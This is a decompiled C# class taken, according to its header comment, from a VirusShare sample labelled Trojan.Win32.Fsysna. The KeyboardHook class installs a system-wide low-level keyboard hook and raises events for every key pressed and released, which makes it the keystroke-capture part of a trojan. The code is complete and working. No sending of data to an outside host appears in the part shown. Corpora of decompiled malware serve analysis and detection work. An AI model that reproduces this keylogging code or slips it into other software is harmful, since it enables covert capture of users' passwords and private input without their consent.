// Decompiled with JetBrains decompiler
// Type: Project_Unamed.KeyboardHook
// Assembly: Project Unnamed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E14D2CAF-643A-42A5-AF85-1F02787E6112
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Fsysna.dkho-1e6991871b0b19bec231c68029dfc8a762f32ed88d5a1aa5b922eb829ff10319.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Project_Unamed
{
  public class KeyboardHook
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private const int HC_ACTION = 0;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private const int WM_KEYUP = 257;
    private const int WM_SYSKEYDOWN = 260;
    private const int WM_SYSKEYUP = 261;
    private static int KeyHook;
    private static KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

    [DebuggerNonUserCode]
    static KeyboardHook()
    {
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (KeyboardHook.__ENCList)
      {
        if (KeyboardHook.__ENCList.Count == KeyboardHook.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (KeyboardHook.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (KeyboardHook.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                KeyboardHook.__ENCList[index1] = KeyboardHook.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          KeyboardHook.__ENCList.RemoveRange(index1, checked (KeyboardHook.__ENCList.Count - index1));
          KeyboardHook.__ENCList.Capacity = KeyboardHook.__ENCList.Count;
        }
        KeyboardHook.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowsHookEx(
      int idHook,
      KeyboardHook.KeyboardProcDelegate lpfn,
      int hmod,
      int dwThreadId);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CallNextHookEx(
      int hHook,
      int nCode,
      int wParam,
      KeyboardHook.KBDLLHOOKSTRUCT lParam);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int UnhookWindowsHookEx(int hHook);

    public static event KeyboardHook.KeyDownEventHandler KeyDown;

    public static event KeyboardHook.KeyUpEventHandler KeyUp;

    public KeyboardHook()
    {
      KeyboardHook.__ENCAddToList((object) this);
      KeyboardHook.KeyHookDelegate = new KeyboardHook.KeyboardProcDelegate(KeyboardHook.KeyboardProc);
      KeyboardHook.KeyHook = KeyboardHook.SetWindowsHookEx(13, KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
    }

    private static int KeyboardProc(int nCode, int wParam, ref KeyboardHook.KBDLLHOOKSTRUCT lParam)
    {
      if (nCode == 0)
      {
        switch (wParam)
        {
          case 256:
          case 260:
            KeyboardHook.KeyDownEventHandler keyDownEvent = KeyboardHook.KeyDownEvent;
            if (keyDownEvent != null)
            {
              keyDownEvent((Keys) lParam.vkCode);
              break;
            }
            break;
          case 257:
          case 261:
            KeyboardHook.KeyUpEventHandler keyUpEvent = KeyboardHook.KeyUpEvent;
            if (keyUpEvent != null)
            {
              keyUpEvent((Keys) lParam.vkCode);
              break;
            }
            break;
        }
      }
      return KeyboardHook.CallNextHookEx(KeyboardHook.KeyHook, nCode, wParam, lParam);
    }

    ~KeyboardHook()
    {
      KeyboardHook.UnhookWindowsHookEx(KeyboardHook.KeyHook);
      // ISSUE: explicit finalizer call
      base.Finalize();
    }

    private struct KBDLLHOOKSTRUCT
    {
      public int vkCode;
      public int scancode;
      public int flags;
      public int time;
      public int dwExtraInfo;
    }

    private delegate int KeyboardProcDelegate(
      int nCode,
      int wParam,
      ref KeyboardHook.KBDLLHOOKSTRUCT lParam);

    public delegate void KeyDownEventHandler(Keys Key);

    public delegate void KeyUpEventHandler(Keys Key);
  }
}
